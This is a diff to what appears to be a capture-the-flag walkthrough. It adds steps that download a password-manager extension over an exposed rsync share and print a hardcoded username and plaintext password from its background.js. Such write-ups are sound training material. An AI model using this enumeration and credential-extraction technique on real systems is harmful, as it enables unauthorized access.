@@ -35,5 +35,11 @@ rsync -av --list-only rsync://192.168.0.24/extensions
 ```
 
 ```bash
-rsync -avz rsync://bola.nyx/extensions/password_manager.zip
+rsync -avz rsync://bola.nyx/extensions/password_manager.zip .
 ```
+
+```bash
+cat background.js
+username: "jackie0x17@nyx.com", password: "sbIJ0x9g{C3`"
+```
+
